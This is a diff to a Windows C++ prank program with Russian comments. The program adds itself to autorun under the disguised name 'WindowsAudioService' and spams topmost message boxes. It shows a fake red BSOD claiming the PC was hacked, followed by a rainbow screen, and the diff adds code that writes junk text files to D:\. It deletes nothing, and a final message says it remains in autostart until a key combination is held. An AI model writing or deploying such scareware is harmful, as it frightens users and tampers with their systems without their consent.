@@ -9,6 +9,7 @@
 #include <string>
 #include <vector>
 #include <atomic>
+#include <fstream>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -19,6 +20,8 @@ static const wchar_t* kRunKey  = L"Software\\Microsoft\\Windows\\CurrentVersion\
 static const wchar_t* kRunName = L"WindowsAudioService";
 
 static std::atomic<bool> g_killSwitch{false};
+static std::atomic<bool> g_bsodActive{false};
+static std::atomic<bool> g_musicPlaying{false};
 
 // ─────────── автозапуск ───────────
 static bool IsAutoRunInstalled() {
@@ -84,19 +87,73 @@ static DWORD WINAPI KillSwitchWatcher(LPVOID) {
     return 0;
 }
 
-// ─────────── музыка (синхронно, блокирует до конца) ───────────
-static DWORD WINAPI MusicPlayer(LPVOID) {
-    // путь к music.wav рядом с exe
+// ─────────── получение пути к папке с exe ───────────
+static std::wstring GetExeDir() {
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(nullptr, exePath, MAX_PATH);
     std::wstring dir(exePath);
     size_t pos = dir.find_last_of(L"\\/");
     if (pos != std::wstring::npos) dir = dir.substr(0, pos + 1);
-    std::wstring wavPath = dir + L"music.wav";
+    return dir;
+}
 
-    // SND_SYNC — блокирует поток пока не доиграет
-    // без SND_LOOP — играет один раз
-    PlaySoundW(wavPath.c_str(), nullptr, SND_FILENAME | SND_SYNC);
+// ─────────── музыка ───────────
+static DWORD WINAPI MusicPlayer(LPVOID) {
+    std::wstring wavPath = GetExeDir() + L"music.wav";
+    g_musicPlaying.store(true);
+    // SND_ASYNC — чтобы можно было стопать снаружи
+    PlaySoundW(wavPath.c_str(), nullptr, SND_FILENAME | SND_ASYNC);
+    // держим 60 секунд максимум или пока BSOD не стартанёт
+    for (int i = 0; i < 1200; ++i) {
+        if (g_killSwitch.load()) break;
+        if (g_bsodActive.load()) break;   // BSOD стартанул — стопаем музыку
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+    }
+    PlaySoundW(nullptr, nullptr, 0);
+    g_musicPlaying.store(false);
+    return 0;
+}
+
+// ─────────── срач файлами на D:\ ───────────
+static DWORD WINAPI FileSpammer(LPVOID) {
+    std::this_thread::sleep_for(std::chrono::seconds(2));
+    if (g_killSwitch.load()) return 0;
+
+    UINT driveType = GetDriveTypeW(L"D:\\");
+    if (driveType == DRIVE_NO_ROOT_DIR || driveType == DRIVE_UNKNOWN) {
+        return 0;
+    }
+
+    const std::wstring content =
+        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf"
+        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf"
+        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf";
+
+    for (int i = 0; i < 10; ++i) {
+        if (g_killSwitch.load()) return 0;
+        std::wstring filename = (i == 0)
+            ? L"D:\\sanya.txt"
+            : L"D:\\sanya_" + std::to_wstring(i) + L".txt";
+
+        std::ofstream f(filename, std::ios::binary | std::ios::trunc);
+        if (f.is_open()) {
+            std::string utf8;
+            for (wchar_t wc : content) {
+                if (wc < 0x80) utf8.push_back((char)wc);
+                else if (wc < 0x800) {
+                    utf8.push_back((char)(0xC0 | (wc >> 6)));
+                    utf8.push_back((char)(0x80 | (wc & 0x3F)));
+                } else {
+                    utf8.push_back((char)(0xE0 | (wc >> 12)));
+                    utf8.push_back((char)(0x80 | ((wc >> 6) & 0x3F)));
+                    utf8.push_back((char)(0x80 | (wc & 0x3F)));
+                }
+            }
+            f.write(utf8.c_str(), utf8.size());
+            f.close();
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    }
     return 0;
 }
 
@@ -119,46 +176,13 @@ static DWORD WINAPI MsgSpammer(LPVOID) {
     std::srand((unsigned)std::time(nullptr) ^ GetCurrentThreadId());
     for (int i = 0; i < 12; ++i) {
         if (g_killSwitch.load()) return 0;
+        if (g_bsodActive.load()) return 0;   // BSOD активен — стопаем месседжбоксы
         const wchar_t* txt = kMessages[std::rand() % kMsgCount];
         std::thread([txt]() {
             MessageBoxW(nullptr, txt, L"Ой, всё",
                         MB_OK | MB_ICONWARNING | MB_TOPMOST);
         }).detach();
         std::this_thread::sleep_for(std::chrono::milliseconds(250));
-    }
-    return 0;
-}
-
-// ─────────── cmd-спам ───────────
-static DWORD WINAPI CmdSpammer(LPVOID) {
-    std::this_thread::sleep_for(std::chrono::seconds(7));
-    for (int i = 0; i < 40; ++i) {
-        if (g_killSwitch.load()) return 0;
-        STARTUPINFOW si{};
-        si.cb = sizeof(si);
-        PROCESS_INFORMATION pi{};
-
-        wchar_t cmdPath[MAX_PATH] = L"C:\\Windows\\System32\\cmd.exe";
-        GetEnvironmentVariableW(L"COMSPEC", cmdPath, MAX_PATH);
-
-        std::wstring cmdStr =
-            std::wstring(L"\"") + cmdPath + L"\" /k "
-            L"echo kaka & echo kaka & echo kaka & "
-            L"echo Sanchez vzlomal tvoy pk & "
-            L"echo kaka & echo kaka & "
-            L"timeout /t 3 /nobreak > nul & exit";
-
-        std::vector<wchar_t> mutCmd(cmdStr.begin(), cmdStr.end());
-        mutCmd.push_back(L'\0');
-
-        if (CreateProcessW(nullptr, mutCmd.data(),
-                          nullptr, nullptr, FALSE,
-                          CREATE_NEW_CONSOLE,
-                          nullptr, nullptr, &si, &pi)) {
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        }
-        std::this_thread::sleep_for(std::chrono::milliseconds(60));
     }
     return 0;
 }
@@ -181,7 +205,14 @@ static DWORD WINAPI CursorDancer(LPVOID) {
     return 0;
 }
 
-// ─────────── красный BSOD ───────────
+// ─────────── красный BSOD с процентами ───────────
+struct BsodState {
+    int percent = 0;
+    bool showArrow = false;
+};
+
+static BsodState g_bsodState;
+
 static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
     if (m == WM_ERASEBKGND) return 1;
     if (m == WM_PAINT) {
@@ -191,6 +222,7 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         GetClientRect(h, &rc);
         const int W = rc.right, H = rc.bottom;
 
+        // фон — тёмно-красный
         HBRUSH bg = CreateSolidBrush(RGB(140, 0, 0));
         FillRect(dc, &rc, bg);
         DeleteObject(bg);
@@ -198,21 +230,23 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         SetBkMode(dc, TRANSPARENT);
         SetTextColor(dc, RGB(255, 255, 255));
 
-        HFONT fFace = CreateFontW(-130, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+        // рожа :)
+        HFONT fFace = CreateFontW(-110, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
             ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
         HGDIOBJ old = SelectObject(dc, fFace);
-        RECT rf{0, (int)(H * 0.08), W, (int)(H * 0.08) + 160};
+        RECT rf{0, (int)(H * 0.05), W, (int)(H * 0.05) + 140};
         DrawTextW(dc, L":)", -1, &rf, DT_CENTER | DT_SINGLELINE);
 
-        HFONT fBig = CreateFontW(-34, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+        // заголовок + инструкция
+        HFONT fBig = CreateFontW(-30, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
             ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
         SelectObject(dc, fBig);
-        RECT rt{60, (int)(H * 0.30), W - 60, H};
+        RECT rt{60, (int)(H * 0.28), W - 60, H};
         const wchar_t* body =
-            L"Твой ПК столкнулся с проблемой и будет перезагружен.\n\n"
-            L"Сбор информации о проблеме... 100% завершено.\n\n"
+            L"Твой ПК столкнулся с проблемой и будет перезагружен.\n"
+            L"Сбор информации о проблеме...\n\n"
             L"Код ошибки: SANCHES_HAX_0xDEADPISKA\n"
             L"Виновник: Sanchez\n"
             L"Сообщение: Sanchez vzlomal tvoy pk piska pi piska\n\n"
@@ -220,18 +254,78 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             L"— Jack & Fox";
         DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);
 
-        HFONT fSmall = CreateFontW(-20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
+        // ─── прогресс-бар с процентами ───
+        const int barY = (int)(H * 0.72);
+        const int barX = 60;
+        const int barW = W - 120;
+        const int barH = 40;
+
+        // рамка
+        HPEN penWhite = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
+        HGDIOBJ oldPen = SelectObject(dc, penWhite);
+        HGDIOBJ oldBrush = SelectObject(dc, GetStockObject(NULL_BRUSH));
+        Rectangle(dc, barX, barY, barX + barW, barY + barH);
+
+        // заполнение — пропорционально проценту
+        if (g_bsodState.percent > 0) {
+            int fillW = (int)((double)barW * g_bsodState.percent / 100.0);
+            RECT fill{barX + 1, barY + 1, barX + fillW, barY + barH - 1};
+            HBRUSH fillBr = CreateSolidBrush(RGB(255, 80, 80));
+            FillRect(dc, &fill, fillBr);
+            DeleteObject(fillBr);
+        }
+
+        SelectObject(dc, oldPen);
+        SelectObject(dc, oldBrush);
+        DeleteObject(penWhite);
+
+        // число процентов слева от бара
+        HFONT fPercent = CreateFontW(-40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
-        SelectObject(dc, fSmall);
-        RECT rs{60, H - 80, W - 60, H - 20};
-        DrawTextW(dc, L"Шутка. Kill switch: Ctrl+Shift+Alt+Q.",
-                  -1, &rs, DT_LEFT | DT_SINGLELINE);
+            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Consolas");
+        SelectObject(dc, fPercent);
+        SetTextColor(dc, RGB(255, 255, 255));
+
+        wchar_t pctBuf[16];
+        wsprintfW(pctBuf, L"%d%%", g_bsodState.percent);
+        RECT rp{barX, barY + barH + 10, barX + 200, barY + barH + 70};
+        DrawTextW(dc, pctBuf, -1, &rp, DT_LEFT | DT_SINGLELINE);
+
+        // ─── красная стрелка на 67 ───
+        if (g_bsodState.showArrow) {
+            // стрелка указывает справа на цифру "67%" возле прогресс-бара
+            int arrowTipX = barX + 150;   // конец стрелки (указывает на 67)
+            int arrowTipY = barY + barH + 40;
+            int arrowBackX = arrowTipX + 200;
+            int arrowHalfH = 25;
+
+            HBRUSH redBr = CreateSolidBrush(RGB(255, 0, 0));
+            HPEN redPen = CreatePen(PS_SOLID, 3, RGB(255, 0, 0));
+            HGDIOBJ pOld = SelectObject(dc, redPen);
+            HGDIOBJ bOld = SelectObject(dc, redBr);
+
+            // линия стрелки
+            MoveToEx(dc, arrowBackX, arrowTipY, nullptr);
+            LineTo(dc, arrowTipX + 40, arrowTipY);
+
+            // наконечник (треугольник)
+            POINT tri[3] = {
+                { arrowTipX, arrowTipY },
+                { arrowTipX + 40, arrowTipY - arrowHalfH },
+                { arrowTipX + 40, arrowTipY + arrowHalfH }
+            };
+            Polygon(dc, tri, 3);
+
+            SelectObject(dc, pOld);
+            SelectObject(dc, bOld);
+            DeleteObject(redBr);
+            DeleteObject(redPen);
+        }
 
         SelectObject(dc, old);
         DeleteObject(fFace);
         DeleteObject(fBig);
-        DeleteObject(fSmall);
+        DeleteObject(fPercent);
         EndPaint(h, &ps);
         return 0;
     }
@@ -240,8 +334,12 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 }
 
 static DWORD WINAPI RedBSOD(LPVOID) {
-    std::this_thread::sleep_for(std::chrono::seconds(9));
+    std::this_thread::sleep_for(std::chrono::seconds(5));
     if (g_killSwitch.load()) return 0;
+
+    g_bsodActive.store(true);
+    // останавливаем музыку
+    PlaySoundW(nullptr, nullptr, 0);
 
     WNDCLASSW wc{};
     wc.lpfnWndProc   = BsodWndProc;
@@ -259,29 +357,112 @@ static DWORD WINAPI RedBSOD(LPVOID) {
     ShowWindow(h, SW_SHOW);
     UpdateWindow(h);
     SetForegroundWindow(h);
-    std::this_thread::sleep_for(std::chrono::seconds(6));
+
+    // последовательность процентов с таймингами на 18 секунд
+    // тайминги: 1 (0.5s), 7 (1.5s), 9 (3s), 18 (5s), 34 (8s), 56 (11s), 67 (14s)
+    struct Step { int pct; int ms; };
+    const Step steps[] = {
+        { 1,  500 }, { 7, 1000 }, { 9, 1500 }, { 18, 2000 },
+        { 34, 3000 }, { 56, 3000 }, { 67, 3000 }
+    };
+
+    for (auto& s : steps) {
+        if (g_killSwitch.load()) { DestroyWindow(h); return 0; }
+        g_bsodState.percent = s.pct;
+        g_bsodState.showArrow = false;
+        InvalidateRect(h, nullptr, TRUE);
+        UpdateWindow(h);
+        std::this_thread::sleep_for(std::chrono::milliseconds(s.ms));
+    }
+
+    // на 67 — показываем стрелку и играем 67.wav
+    g_bsodState.percent = 67;
+    g_bsodState.showArrow = true;
+    InvalidateRect(h, nullptr, TRUE);
+    UpdateWindow(h);
+
+    // играем 67.wav синхронно
+    std::wstring wav67 = GetExeDir() + L"67.wav";
+    PlaySoundW(wav67.c_str(), nullptr, SND_FILENAME | SND_SYNC);
+
+    // держим ещё немного чтобы стрелка была видна
+    for (int i = 0; i < 40; ++i) {
+        if (g_killSwitch.load()) break;
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+    }
+
+    // убираем окно
+    DestroyWindow(h);
+    g_bsodActive.store(false);
+    return 0;
+}
+
+// ─────────── радужный экран ───────────
+static DWORD WINAPI RainbowScreen(LPVOID) {
+    // ждём пока BSOD закончится (18 сек после старта BSOD = 5 + 18 = 23 сек от запуска)
+    std::this_thread::sleep_for(std::chrono::seconds(24));
+    if (g_killSwitch.load()) return 0;
+
+    WNDCLASSW wc{};
+    wc.lpfnWndProc   = DefWindowProcW;
+    wc.hInstance     = GetModuleHandleW(nullptr);
+    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
+    wc.lpszClassName = L"JackFoxRainbow";
+    RegisterClassW(&wc);
+
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+    HWND h = CreateWindowExW(
+        WS_EX_TOPMOST, L"JackFoxRainbow", L"",
+        WS_POPUP, 0, 0, sw, sh,
+        nullptr, nullptr, wc.hInstance, nullptr);
+    ShowWindow(h, SW_SHOW);
+    UpdateWindow(h);
+    SetForegroundWindow(h);
+
+    HDC hdc = GetDC(h);
+
+    // радуга 7 полос + играем 67.wav
+    std::wstring wav67 = GetExeDir() + L"67.wav";
+    PlaySoundW(wav67.c_str(), nullptr, SND_FILENAME | SND_ASYNC);
+
+    const COLORREF colors[] = {
+        RGB(255,0,0), RGB(255,127,0), RGB(255,255,0),
+        RGB(0,255,0), RGB(0,0,255), RGB(75,0,130), RGB(143,0,255)
+    };
+    int stripeH = sh / 7;
+    for (int i = 0; i < 7; ++i) {
+        RECT r{0, i * stripeH, sw, (i + 1) * stripeH};
+        HBRUSH br = CreateSolidBrush(colors[i]);
+        FillRect(hdc, &r, br);
+        DeleteObject(br);
+    }
+
+    // держим 5 секунд
+    for (int i = 0; i < 100; ++i) {
+        if (g_killSwitch.load()) break;
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+    }
+
+    PlaySoundW(nullptr, nullptr, 0);
+    ReleaseDC(h, hdc);
     DestroyWindow(h);
     return 0;
 }
 
-// ─────────── финал: ждёт конца музыки, потом MessageBox ───────────
+// ─────────── финал ───────────
 static DWORD WINAPI FinalWord(LPVOID) {
-    // ждём конца музыки — сам PlaySound с SND_SYNC уже отработал в MusicPlayer,
-    // но FinalWord должен дождаться именно этого момента.
-    // Проще: проверяем что музыка закончилась через таймер 45 сек + запас.
-    // Но лучший способ — использовать событие. Сделаем через простую задержку.
-
-    // Даём 60 секунд максимум (45 сек трек + запас), но если kill switch — выходим раньше
-    for (int i = 0; i < 1200; ++i) {  // 1200 * 50ms = 60 сек
+    // ждём пока всё закончится: BSOD (5+18=23) + радуга (5) + запас = 30 сек
+    for (int i = 0; i < 600; ++i) {
         if (g_killSwitch.load()) return 0;
         std::this_thread::sleep_for(std::chrono::milliseconds(50));
     }
-
     if (g_killSwitch.load()) return 0;
     PlaySoundW(nullptr, nullptr, 0);
 
     MessageBoxW(nullptr,
         L"Это была шутка. Ничего не удалено.\n\n"
+        L"Файлы sanya.txt на D:\\ можешь удалить вручную.\n"
         L"Я остаюсь в автозагрузке и буду вылезать каждый раз.\n\n"
         L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n\n"
         L"— Jack & Fox",
@@ -299,17 +480,13 @@ int main() {
 
     if (!IsAutoRunInstalled()) InstallAutoRun();
 
-    // музыка стартует первой
     CreateThread(nullptr, 0, MusicPlayer,       nullptr, 0, nullptr);
-
-    // параллельно с музыкой — все приколы
     CreateThread(nullptr, 0, KillSwitchWatcher, nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, FileSpammer,       nullptr, 0, nullptr);
     CreateThread(nullptr, 0, MsgSpammer,        nullptr, 0, nullptr);
     CreateThread(nullptr, 0, CursorDancer,      nullptr, 0, nullptr);
-    CreateThread(nullptr, 0, CmdSpammer,        nullptr, 0, nullptr);
     CreateThread(nullptr, 0, RedBSOD,           nullptr, 0, nullptr);
-
-    // финалка — через 60 сек (гарантированно после конца 45-сек трека)
+    CreateThread(nullptr, 0, RainbowScreen,     nullptr, 0, nullptr);
     CreateThread(nullptr, 0, FinalWord,         nullptr, 0, nullptr);
 
     Sleep(INFINITE);
